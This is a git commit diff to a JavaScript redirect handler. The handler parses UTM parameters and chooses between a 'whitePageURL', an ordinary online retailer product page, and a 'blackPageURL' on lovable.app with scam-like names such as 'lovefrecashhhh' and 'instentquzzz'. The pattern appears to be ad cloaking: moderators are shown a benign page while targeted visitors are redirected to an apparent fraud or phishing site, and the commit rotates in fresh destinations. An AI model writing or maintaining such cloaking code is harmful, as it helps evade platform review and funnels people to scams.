5dae442b2d6dfba8f10d0c7fc7e3dc861fe9cf88
abdullahch3332 <abdullahch3332@gmail.com>
2025-10-30 04:37:36 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.babyshower.es/en/organic-moonie-teddy-light-sound-polar-bear-6129.html";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/wohndecke-soft-design91-streifen-steppung-gestreifte-decke-gesteppte-sofadecke-S0KC90BC/";
+    const blackPageURL = "https://instentquzzz.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
